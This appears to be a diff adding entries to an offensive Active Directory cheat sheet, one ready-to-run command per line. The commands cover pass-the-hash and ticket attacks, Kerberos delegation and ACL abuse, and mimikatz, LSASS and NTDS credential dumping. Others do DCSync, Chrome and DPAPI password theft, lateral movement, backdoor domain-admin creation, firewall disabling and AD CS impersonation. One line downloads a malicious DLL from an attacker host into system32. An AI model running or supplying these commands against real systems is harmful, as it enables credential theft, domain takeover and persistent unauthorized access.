+Pass-the-Hash:impacket-smbexec -hashes :<ntlm> <domain>/<user>@<target> # SMB exec with hash; kali-machine
+Pass-the-Hash:impacket-dcomexec -hashes :<ntlm> <domain>/<user>@<target> # DCOM exec with hash; kali-machine
+Pass-the-Hash:xfreerdp /v:<target> /u:<user> /pth:<ntlm> # RDP with hash (if Restricted Admin mode enabled); kali-machine
+Pass-the-Hash:pth-winexe -U <domain>/<user>%<ntlm_hash> //<target> cmd.exe # Pass-the-hash for cmd shell https://github.com/byt3bl33d3r/pth-toolkit/tree/master; kali-machine
+Pass-the-Hash:.\mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm> /run:powershell.exe" # Pass-the-hash with mimikatz from target; target-machine
+Overpass-the-Hash:.\Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt # Request TGT with NTLM hash; target-machine
+Overpass-the-Hash:.\Rubeus.exe asktgt /user:<user> /aes256:<aes> /ptt # Request TGT with AES key; target-machine
+Pass-the-Ticket:.\Rubeus.exe ptt /ticket:ticket.kirbi # Inject ticket into current session; target-machine
+Pass-the-Ticket:.\mimikatz.exe "kerberos::ptt ticket.kirbi" # Inject ticket with mimikatz; target-machine
+Pass-the-Ticket:export KRB5CCNAME=ticket.ccache && impacket-psexec -k -no-pass <domain>/<user>@<target> # Use ticket with impacket; kali-machine
+S4U2Proxy:.\Rubeus.exe s4u /user:<service_account> /rc4:<ntlm> /impersonateuser:administrator /altservice:ldap /msdsspn:host/<dc-ip>.<domain> /ptt # S4U2Proxy abuse; target-machine
+S4U2Self:.\Rubeus.exe s4u /user:<service_account> /rc4:<ntlm> /impersonateuser:administrator /msdsspn:host/<dc-ip>.<domain> /ptt # S4U2Self abuse; target-machine
+Unconstrained Delegation:.\Rubeus.exe monitor /interval:5 /filteruser:<target_user> # Monitor for TGTs on unconstrained delegation server; target-machine
+Unconstrained Delegation:.\Rubeus.exe harvest /interval:30 # Harvest tickets on unconstrained server; target-machine
+RBCD:impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Password123!' -dc-ip <dc-ip> <domain>/<user>:'<password>' # Add computer account; kali-machine
+RBCD:.\Rubeus.exe rbcd /tgt:<target_computer>$ /tgs:<attacker_computer>$ /nowrap # Set RBCD on target; target-machine
+RBCD:.\Rubeus.exe s4u /user:<attacker_computer>$ /rc4:<ntlm> /impersonateuser:administrator /msdsspn:cifs/<target>.<domain> /ptt # Impersonate admin; target-machine
+ACL Abuse:Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <user> -Rights ResetPassword -Verbose # Grant password reset rights; target-machine
+ACL Abuse:Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) # Reset password with rights; target-machine
+ACL Abuse:Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> # Add to group with write permissions; target-machine
+ACL Abuse:Add-ObjectACL -TargetDistinguishedName "DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync # Grant DCSync rights; target-machine
+GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_password # Find GPP passwords; kali-machine
+GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_autologin # Find autologon creds; kali-machine
+GPP/cPassword:gpp-decrypt <cpassword> # Decrypt GPP password; kali-machine
+LAPS:nxc ldap <dc-ip> -u '<user>' -p '<password>' --laps # Extract LAPS passwords; kali-machine
+LAPS:Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | where {$_.'ms-Mcs-AdmPwd' -ne $null} # PowerShell LAPS query; target-machine
+Trust Attacks:impacket-raiseChild -target-exec <child_dc_ip> <child_domain>/<user>:'<password>' # Child to parent domain privesc; kali-machine
+Trust Attacks:nltest /domain_trusts # List trusts; target-machine
+Trust Attacks:nltest /server:<dc-ip> /trusted_domains # List trusted domains; target-machine
+
+AD Recon One Scream:echo [+] Domain:%USERDNSDOMAIN% && echo [+] DCs: && nltest /dclist:%USERDNSDOMAIN% && echo [+] Trusts: && nltest /domain_trusts # Quick AD context from Windows host; target-machine
+Mimikatz # 1:.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" "exit" # Full credential dump; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt # Save logon passwords to file; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt # Dump SAM hashes; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit" > secrets.txt # Dump LSA secrets; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" # Export all Kerberos tickets; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit" # Dump domain cache; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "vault::cred" "exit" # Dump Windows Vault; target-machine
+Mimikatz # 1:.\mimikatz.exe "privilege::debug" "dpapi::chrome" "exit" # Dump Chrome saved passwords; target-machine
+NanoDump # 1:nxc smb <target> -u '<user>' -p '<password>' -M nanodump # Dump LSASS remotely via nxc; kali-machine
+NanoDump # 1:.\nanodump.exe -o lsass.dmp # Dump LSASS locally; target-machine
+NanoDump # 1:.\nanodump.exe -w -o lsass.dmp # Write dump to disk; target-machine
+LSASS Dump # 1:procdump64.exe -accepteula -ma lsass.exe lsass.dmp # Dump LSASS with procdump; target-machine
+LSASS Dump # 1:rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full # Dump LSASS with comsvcs; target-machine
+Pypykatz:pypykatz lsa minidump lsass.dmp # Parse LSASS minidump on Kali; kali-machine
+Secretsdump # 1:impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL # Extract hashes from saved hives; kali-machine
+Secretsdump # 1:impacket-secretsdump -ntds ntds.dit -system system.save LOCAL # Extract domain hashes from NTDS.dit; kali-machine
+Secretsdump # 1:impacket-secretsdump '<domain>/<user>:<password>'@<target> # Remote secretsdump; kali-machine
+NTDS.dit # 1:nxc smb <target> -u '<user>' -p '<password>' -M ntdsutil # Dump NTDS via ntdsutil module; kali-machine
+NTDS.dit # 1:impacket-secretsdump -just-dc-ntlm '<domain>/<user>:<password>'@<dc-ip> # DCSync style NTDS dump; kali-machine
+NTDS.dit # 1:ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q # Create IFM on DC; target-machine
+NTDS.dit # 1:awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt # Clean dumped credential output; kali-machine
+LSA Secrets # 1:nxc smb <target> -u '<user>' -p '<password>' --lsa # Dump LSA secrets; kali-machine
+LSA Secrets # 1:reg save hklm\security security.save && reg save hklm\system system.save # Save registry hives; target-machine
+LSA Secrets # 1:impacket-secretsdump -security security.save -system system.save LOCAL # Extract LSA secrets; kali-machine
+SAM Dump # 1:nxc smb <target> -u '<user>' -p '<password>' --sam # Dump SAM hashes; kali-machine
+SAM Dump # 1:reg save hklm\sam sam.save && reg save hklm\system system.save # Save SAM hives; target-machine
+SAM Dump # 1:impacket-secretsdump -sam sam.save -system system.save LOCAL # Extract SAM hashes; kali-machine
+DPAPI # 1:donpapi collect -t <target> -d <domain> -u <user> -H <ntlm> # Collect DPAPI secrets remotely; kali-machine
+DPAPI # 1:.\donpapi.exe # Run DonPAPI locally; target-machine
+DPAPI # 1:mimikatz "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\*" # Dump DPAPI creds; target-machine
+Rubeus # 1:.\Rubeus.exe dump /nowrap # Dump all tickets; target-machine
+Rubeus # 1:.\Rubeus.exe triage # List current tickets; target-machine
+Rubeus # 1:.\Rubeus.exe purge # Purge tickets; target-machine
+Rubeus # 1:.\Rubeus.exe klist # List tickets; target-machine
+Rubeus # 1:.\Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt # Request TGT with NTLM hash; target-machine
+Rubeus # 1:.\Rubeus.exe asktgt /user:<user> /aes256:<aes> /ptt # Request TGT with AES key; target-machine
+Rubeus # 1:.\Rubeus.exe renew /ticket:<ticket> # Renew ticket; target-machine
+Rubeus # 1:.\Rubeus.exe ptt /ticket:ticket.kirbi # Inject ticket; target-machine
+Rubeus # 1:.\Rubeus.exe monitor /interval:5 # Monitor for new tickets; target-machine
+Rubeus # 1:.\Rubeus.exe convert /ticket:<file> /format:ccache # Ticket Converter - Kirbi to CCache; target-machine
+Rubeus # 1:.\Rubeus.exe convert /ticket:<file> /format:kirbi # Ticket Converter - CCache to Kirbi; target-machine
+Impacket Lateral Movement # 1:impacket-psexec -hashes :<ntlm> <domain>/<user>@<target> # PSExec with hash; kali-machine
+Impacket Lateral Movement # 1:impacket-wmiexec -hashes :<ntlm> <domain>/<user>@<target> # WMI with hash; kali-machine
+Impacket Lateral Movement # 1:impacket-smbexec -hashes :<ntlm> <domain>/<user>@<target> # SMB exec with hash; kali-machine
+Impacket Lateral Movement # 1:impacket-dcomexec -hashes :<ntlm> <domain>/<user>@<target> # DCOM with hash; kali-machine
+Impacket Lateral Movement # 1:impacket-atexec -hashes :<ntlm> <domain>/<user>@<target> 'whoami' # Task scheduler exec; kali-machine
+Impacket Lateral Movement # 2:impacket-psexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target> # PSExec with password; kali-machine
+Impacket Lateral Movement # 2:impacket-wmiexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target> # WMI with password; kali-machine
+Impacket Lateral Movement # 2:impacket-smbexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target> # SMB exec with password; kali-machine
+Impacket Lateral Movement # 2:impacket-dcomexec -dc-ip <dc-ip> <domain>/<user>:<password>@<target> # DCOM with password; kali-machine
+Impacket Lateral Movement # 3:impacket-psexec -k -no-pass -dc-ip <dc-ip> <domain>/<user>@<target> # PSExec with Kerberos ticket; kali-machine
+Impacket Lateral Movement # 3:impacket-wmiexec -k -no-pass -dc-ip <dc-ip> <domain>/<user>@<target> # WMI with Kerberos; kali-machine
+Impacket Lateral Movement # 3:impacket-smbexec -k -no-pass -dc-ip <dc-ip> <domain>/<user>@<target> # SMB exec with Kerberos; kali-machine
+Evil-WinRM # 1:evil-winrm -i <target> -u '<domain>\<user>' -H '<ntlm>' # Connect with NTLM hash; kali-machine
+Evil-WinRM # 1:evil-winrm -i <target> -u '<user>' -p '<password>' # Connect with password; kali-machine
+Evil-WinRM # 1:evil-winrm -i <target> -u '<domain>\<user>' -p '<password>' # Connect with domain user; kali-machine
+Evil-WinRM # 1:evil-winrm -i <target> -u <user> -H '<ntlm>' # Connect with NT hash; kali-machine
+Evil-WinRM # 1:menu # Evil-WinRM help menu; kali-machine
+Enable SMB Guest Only:reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && net stop lanmanworkstation && net start lanmanworkstation && net stop lanmanserver && net start lanmanserver # Enable SMB guest access only locally; target-machine
+Enable RDP # 1:nxc smb <target> -u '<user>' -p '<password>' -x 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' # Enable RDP remotely; kali-machine
+Enable RDP # 1:nxc smb <target> -u '<user>' -p '<password>' -x 'netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes' # Allow RDP in firewall; kali-machine
+Enable RDP # 2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f # Enable RDP locally; target-machine
+Enable RDP # 2:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && net stop termservice && net start termservice # Enable RDP only; target-machine
+Enable RDP # 2:netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes # Allow RDP in firewall; target-machine
+Enable RDP # 3:xfreerdp3 /v:<target> /d:<domain> /u:<user> /p:'<password>' /dynamic-resolution # Connect via RDP; kali-machine
+Enable WinRM # 1:nxc smb <target> -u '<user>' -p '<password>' -x 'winrm quickconfig -q' # Enable WinRM remotely; kali-machine
+Enable WinRM # 1:winrm quickconfig -q # Enable WinRM locally; target-machine
+Enable WinRM # 1:netsh advfirewall firewall set rule group="Windows Remote Management" new enable=Yes # Allow WinRM in firewall; target-machine
+Enable WinRM # 2:reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && winrm quickconfig -q && sc config winrm start= auto && net start winrm && netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f # Enable WinRM only; target-machine
+Disable Firewall # 1:nxc smb <target> -u '<user>' -p '<password>' -x 'netsh advfirewall set allprofiles state off' # Disable firewall remotely; kali-machine
+Disable Firewall # 1:netsh advfirewall set allprofiles state off # Disable firewall locally; target-machine
+Create User # 1:net user <user> <password> /add /domain # Create domain user. Use edwin/P@ssw0rd@123 as test; target-machine
+Create User # 1:net group "Domain Admins" <user> /add /domain # Add user to Domain Admins; target-machine
+Create User # 1:net localgroup Administrators <user> /add # Add to local admins; target-machine
+Create User # 1:net localgroup "Remote Desktop Users" <user> /add # Add to RDP group; target-machine
+Create User # 1:net localgroup "Remote Management Users" <user> /add # Add to WinRM group; target-machine
+Create User # 2:net user edwin P@ssw0rd@123 /add /domain # Create test user edwin; target-machine
+Create User # 2:net group "Domain Admins" edwin /add /domain # Add edwin to Domain Admins; target-machine
+Create User # 2:net localgroup Administrators edwin /add # Add edwin to local admins; target-machine
+Create User # 2:xfreerdp3 /v:<target> /u:edwin /p:'P@ssw0rd@123' /dynamic-resolution /clipboard /drive:share,/home/kali # RDP as edwin with drive share; kali-machine
+SeBackupPrivilege:reg save hklm\sam C:\sam.save && reg save hklm\system C:\system.save && reg save hklm\security C:\security.save # Dump registry hives with SeBackupPrivilege; target-machine
+SeBackupPrivilege:impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL # Extract hashes from saved hives; kali-machine
+SeManageVolume:.\SeManageVolumeExploit.exe # Run SeManageVolume exploit; target-machine
+SeManageVolume:icacls C:\ # Check volume permissions after exploit; target-machine
+SeManageVolume:wget http://<kali>:80/tzres.dll -O c:\windows\system32\wbem\tzres.dll; systeminfo # Upload malicious DLL; target-machine
+PowerUp:. .\PowerUp.ps1; Invoke-AllChecks # Run PowerUp checks; target-machine
+PowerUp:Invoke-ServiceAbuse -Name '<filename1>' # Attempt automated service abuse; target-machine
+PowerUp:Restore-ServiceBinary -Name '<filename1>' # Restore after service abuse; target-machine
+PowerView:Get-NetForestDomain # Enumerate forest domains; target-machine
+AD Permission Discovery:Import-Module .\PowerView.ps1 # Load PowerView; target-machine
+AD Permission Discovery:Get-ObjectAcl -Identity <user> | ForEach-Object { [PSCustomObject]@{ IdentityReference = (Convert-SidToName -Sid $_.SecurityIdentifier); SID = $_.SecurityIdentifier; Rights = $_.ActiveDirectoryRights } } | Format-Table -AutoSize # Enumerate ACL entries; target-machine
+AD Permission Discovery:[System.Security.Principal.SecurityIdentifier]::new("<SID>").Translate([System.Security.Principal.NTAccount]) # Resolve SID to account name; target-machine
+AD Permission Discovery:Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|ExtendedRight|WriteProperty|Self"} | Format-Table -AutoSize # Find high rights; target-machine
+AD Permission Discovery:$interesting='GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword'; (Get-NetUser|Select-Object -ExpandProperty samaccountname) + (Get-NetGroup|Select-Object -ExpandProperty cn)|ForEach-Object{$o=$_;Get-ObjectAcl -Identity $o|Where-Object{$_.ActiveDirectoryRights -match $interesting}|ForEach-Object{$r=Convert-SidToName -Sid $_.SecurityIdentifier;[PSCustomObject]@{Object=$o;Principal=$r;Rights=$_.ActiveDirectoryRights}}}|Format-Table -AutoSize # Enumerate all users and groups with high rights; target-machine
+Domain Admins Enum:net rpc group members "Domain Admins" -U <domain>/<user>%'<password>' -S <dc-ip> # Enumerate Domain Admins membership; kali-machine
+Domain Admins Enum:net rpc group addmem "Domain Admins" "<user>" -U <domain>/<user>%'<password>' -S <dc-ip> # Add user to Domain Admins when you have rights; kali-machine
+Unprivileged Password Reset:net rpc password '<target_user>' '<new_password>' -U '<domain>/<user>%<password>' -S <dc-ip> # Reset another user's password over SMB/RPC; kali-machine
+Unprivileged Password Reset:Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) # Reset password with PowerView; target-machine
+Unprivileged Password Reset:Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) # Reset with AD module; target-machine
+GPO Abuse:.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy" # Modify GPO to add local admin; target-machine
+GPO Abuse:gpupdate /force # Force Group Policy update; target-machine
+Enable Everything Ultimate:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && netsh advfirewall set allprofiles state off && netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && winrm quickconfig -q && sc config winrm start= auto && net stop termservice && net start termservice && net stop lanmanworkstation && net start lanmanworkstation && net stop lanmanserver && net start lanmanserver && net start winrm && dism /online /norestart /enable-feature /featurename:SMB1Protocol && net localgroup "Remote Desktop Users" "<user>" /add # ULTIMATE: Enable RDP + WinRM + SMB guest + disable firewall + all services; target-machine
+Enable Everything Ultimate:reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f && ^
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && ^
+reg add "HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymous" /t REG_DWORD /d 0 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "RestrictAnonymousSAM" /t REG_DWORD /d 0 /f && ^
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "EveryoneIncludesAnonymous" /t REG_DWORD /d 1 /f && ^
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f && ^
+netsh advfirewall set allprofiles state off && ^
+netsh advfirewall firewall add rule name="WinRM Public" dir=in action=allow protocol=TCP localport=5985 && ^
+winrm quickconfig -q && ^
+sc config winrm start= auto && ^
+net stop termservice && net start termservice && ^
+net stop lanmanworkstation && net start lanmanworkstation && ^
+net stop lanmanserver && net start lanmanserver && ^
+net start winrm && ^
+dism /online /norestart /enable-feature /featurename:SMB1Protocol && ^
+net localgroup "Remote Desktop Users" "<user>" /add # ENABLES: RDP + WinRM + SMB guest + firewall off + all services; target-machine
+AD CS:certipy-ad find -u '<user>' -p '<password>' -dc-ip <dc-ip> -vulnerable # enumerate AD CS certificate authorities and templates, highlighting misconfigurations and vulnerable ESC paths that may allow privilege escalation; kali-machine
+AD CS:certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> # enumerate AD CS objects and certificate templates to identify enrollable templates, dangerous EKUs, weak enrollment rights, and potential abuse paths; kali-machine
+AD CS:certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca <CA_NAME> -template <VULN_TEMPLATE> -target <dc-ip> -upn administrator@<domain> # request a certificate from a vulnerable template while supplying an alternative UPN to impersonate another account such as Administrator; kali-machine
+AD CS:certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip> # authenticate to the domain with the issued PFX certificate and obtain Kerberos credentials or NT hash material for the impersonated account; kali-machine
+AD CS:certipy-ad relay -ca <CA_IP> -template DomainController # relay captured NTLM authentication to the Certificate Authority to request a certificate from the specified template, typically for certificate-based privilege escalation; kali-machine
+AD CS:certipy-ad shadow auto -u '<user>@<domain>' -p '<password>' -account <target_account> -dc-ip <dc-ip> # automatically add a shadow credential (msDS-KeyCredentialLink) to the target account, authenticate as that account via PKINIT, then restore the original attribute; kali-machine
+^Dump hashes remotely (requires admin):nxc smb <target> -u <user> -p <password> --sam | fgrep -v '[' | awk -F: '{print $4}' | tee dumped_hashes.txt
+^Dump hashes remotely (requires admin):nxc smb <target> -u <user> -p <password> -M lsassy | fgrep -v '[' | awk '{print $6}' >> tee dumped_hashes.txt
+^Dump hashes remotely (requires admin):nxc smb <target> -u <user> -p <password> -M ntdsutil | fgrep -v '[' | awk '{print $4}' >> tee dumped_hashes.txt
+^Dump hashes remotely (requires admin):awk 'NF {print $1}' dumped_hashes.txt | sort -u | tee unique_hashes.txt
